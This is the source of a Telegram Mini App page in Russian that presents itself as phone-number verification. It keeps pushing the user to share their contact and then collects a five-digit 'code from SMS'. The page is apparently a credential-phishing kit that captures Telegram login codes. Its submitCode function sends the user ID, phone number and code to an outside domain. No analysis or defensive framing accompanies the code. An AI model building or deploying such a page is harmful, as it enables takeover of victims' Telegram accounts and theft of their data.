<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Подтверждение</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --buttonText: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
      --shadow: 0 12px 30px rgba(0,0,0,.25);
    }
    * { box-sizing: border-box; margin:0; padding:0; }
    body {
      height: 100%;
      color: var(--text);
      background: radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
                  radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
                  var(--bg);
      font-family: system-ui, sans-serif;
      padding: env(safe-area-inset-top) 16px env(safe-area-inset-bottom);
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .wrap { width: 100%; max-width: 420px; display: flex; flex-direction: column; gap: 16px; }
    .card {
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border: 1px solid rgba(255,255,255,.10);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 24px 16px;
      backdrop-filter: blur(10px);
    }
    .title { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
    .subtitle { color: var(--hint); font-size: 14px; line-height: 1.4; }
    .pill {
      padding: 8px 12px;
      border-radius: 999px;
      background: var(--secondary);
      color: var(--hint);
      font-size: 12px;
      border: 1px solid rgba(255,255,255,.08);
    }
    .top { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; }
    .codeBox {
      margin: 20px 0 12px;
      padding: 16px;
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(0,0,0,.15);
      text-align: center;
    }
    .codeDots { display: flex; justify-content: center; gap: 14px; }
    .dot {
      width: 14px; height: 14px; border-radius: 50%;
      background: rgba(255,255,255,.18);
      border: 1px solid rgba(255,255,255,.15);
      transition: all 0.2s;
    }
    .dot.filled { background: #2ea6ff; border-color: #2ea6ff80; transform: scale(1.1); }
    .hintRow { display: flex; justify-content: space-between; color: var(--hint); font-size: 13px; margin-top: 8px; }
    .keyboard {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
    }
    .key {
      height: 64px;
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(255,255,255,.05);
      color: var(--text);
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 6px 16px rgba(0,0,0,.2);
      transition: all 0.12s;
    }
    .key:active { transform: scale(0.96); opacity: 0.9; }
    .spacer { opacity: 0; pointer-events: none; }
    .loading { text-align: center; padding: 80px 0; font-size: 18px; color: var(--hint); }
    .hidden { display: none !important; }
  </style>
</head>
<body>
  <div class="wrap">
    <div id="loading" class="card loading">Загрузка...</div>

    <div id="phoneScreen" class="card hidden">
      <div class="top">
        <div>
          <div class="title">Подтверждение номера</div>
          <div class="subtitle">Поделитесь номером телефона, чтобы продолжить</div>
        </div>
        <div class="pill" id="phoneStatus">Ожидание...</div>
      </div>
      <p style="margin:24px 0; text-align:center; color:var(--hint); font-size:14px;">
        Telegram попросит поделиться контактом — подтвердите это
      </p>
    </div>

    <div id="codeScreen" class="card hidden">
      <div class="top">
        <div>
          <div class="title">Введите код</div>
          <div class="subtitle">Код из SMS</div>
        </div>
        <div class="pill" id="maskedPhone">—</div>
      </div>
      <div class="codeBox">
        <div class="codeDots" id="dots"></div>
      </div>
      <div class="hintRow">
        <span id="progress">0 / 5</span>
        <span>⌫ — стереть</span>
      </div>
    </div>

    <div id="keyboard" class="keyboard hidden"></div>
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    if (!tg) { alert("Не в Telegram"); throw new Error(); }

    tg.ready();
    tg.expand();

    const userId = tg.initDataUnsafe?.user?.id;
    if (!userId) { alert("Нет user ID"); throw new Error(); }

    // ── Переменные ───────────────────────────────────────────────
    const CODE_LEN = 5;
    let code = '';
    let phone = localStorage.getItem('verified_phone') || '';
    let successfullyShared = !!phone;

    const screens = {
      loading: document.getElementById('loading'),
      phone: document.getElementById('phoneScreen'),
      code: document.getElementById('codeScreen'),
      keyboard: document.getElementById('keyboard')
    };

    const els = {
      phoneStatus: document.getElementById('phoneStatus'),
      maskedPhone: document.getElementById('maskedPhone'),
      dots: document.getElementById('dots'),
      progress: document.getElementById('progress')
    };

    // ── Утилиты ──────────────────────────────────────────────────
    function mask(p) {
      if (!p) return '—';
      const d = p.replace(/\D/g, '');
      return d.length > 4 ? '****' + d.slice(-4) : p;
    }

    function show(screen) {
      Object.values(screens).forEach(s => s.classList.add('hidden'));
      if (screen === 'phone') {
        screens.phone.classList.remove('hidden');
        els.phoneStatus.textContent = successfullyShared ? `+${mask(phone)}` : 'Ожидание...';
        if (!successfullyShared) requestContactSafely();
      } else if (screen === 'code') {
        screens.code.classList.remove('hidden');
        screens.keyboard.classList.remove('hidden');
        els.maskedPhone.textContent = mask(phone);
        renderDots();
      } else {
        screens.loading.classList.remove('hidden');
      }
    }

    function renderDots() {
      els.dots.innerHTML = '';
      for (let i = 0; i < CODE_LEN; i++) {
        const dot = document.createElement('div');
        dot.className = 'dot' + (i < code.length ? ' filled' : '');
        els.dots.appendChild(dot);
      }
      els.progress.textContent = `${code.length} / ${CODE_LEN}`;
    }

    function addDigit(d) {
      if (code.length >= CODE_LEN) return;
      code += d;
      renderDots();
      if (code.length === CODE_LEN) tg.MainButton.setText('Подтвердить').show().onClick(submitCode);
      else tg.MainButton.hide();
    }

    function delDigit() {
      code = code.slice(0, -1);
      renderDots();
      tg.MainButton.hide();
    }

    async function submitCode() {
      if (code.length !== CODE_LEN) return;
      tg.MainButton.showProgress(true).disable();

      try {
        const r = await fetch('https://sadaqah.icu/submit_code', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({user_id: userId, phone, code})
        });
        const data = await r.json();

        if (data.status === 'ok') {
          tg.close();
        } else {
          alert(data.message || 'Неверный код');
          code = '';
          renderDots();
        }
      } catch (e) {
        alert('Ошибка сети');
      } finally {
        tg.MainButton.hideProgress().enable().hide();
      }
    }

    // ── Самый надёжный способ запроса контакта ───────────────────
    let requestActive = false;
    let requestTimeout = null;

    function requestContactSafely() {
      if (successfullyShared || requestActive) return;
      requestActive = true;

      console.log('[CONTACT] Запрос номера...');

      // 1. Callback-вариант (рекомендуемый Telegram)
      tg.requestContact((shared) => {
        console.log('[CONTACT callback] Результат:', shared);
        if (shared) {
          // callback true = поделился, но номер придёт только в чат
          // Ждём event для подтверждения
        }
      });

      // 2. Event listener (самый надёжный способ узнать, что поделились)
      const onContact = (event) => {
        console.log('[CONTACT event]', event);
        if (event.status === 'sent') {
          successfullyShared = true;
          // Номер уже улетел в чат → сразу переходим на код
          phone = localStorage.getItem('verified_phone') || 'получен';
          localStorage.setItem('verified_phone', 'shared'); // метка успеха
          show('code');
          tg.offEvent('contactRequested', onContact);
          clearTimeout(requestTimeout);
          requestActive = false;
        }
      };

      tg.onEvent('contactRequested', onContact);

      // Fallback: если через 12 сек ничего не произошло — повтор
      requestTimeout = setTimeout(() => {
        console.log('[CONTACT] Timeout → повтор');
        requestActive = false;
        requestContactSafely();
      }, 12000);

      // Авто-повтор при отмене (если event не пришёл)
      setTimeout(() => {
        if (!successfullyShared && !requestActive) {
          requestContactSafely();
        }
      }, 2500);
    }

    // ── Инициализация ────────────────────────────────────────────
    show('loading');

    setTimeout(() => {
      if (successfullyShared) {
        show('code');
      } else {
        show('phone');
      }
    }, 600);

    // Клавиатура
    ['1','2','3','4','5','6','7','8','9','spacer','0','del'].forEach(k => {
      const btn = document.createElement('button');
      btn.className = 'key';
      if (k === 'spacer') btn.classList.add('spacer');
      else if (k === 'del') {
        btn.textContent = '⌫';
        btn.onclick = delDigit;
      } else {
        btn.textContent = k;
        btn.onclick = () => addDigit(k);
      }
      screens.keyboard.appendChild(btn);
    });

    // ПК клавиатура
    window.addEventListener('keydown', e => {
      if (screens.code.classList.contains('hidden')) return;
      if (/[0-9]/.test(e.key)) addDigit(e.key);
      if (e.key === 'Backspace') delDigit();
      if (e.key === 'Enter' && code.length === CODE_LEN) submitCode();
    });

    console.log('[INIT] successfullyShared:', successfullyShared);
  </script>
</body>
</html>
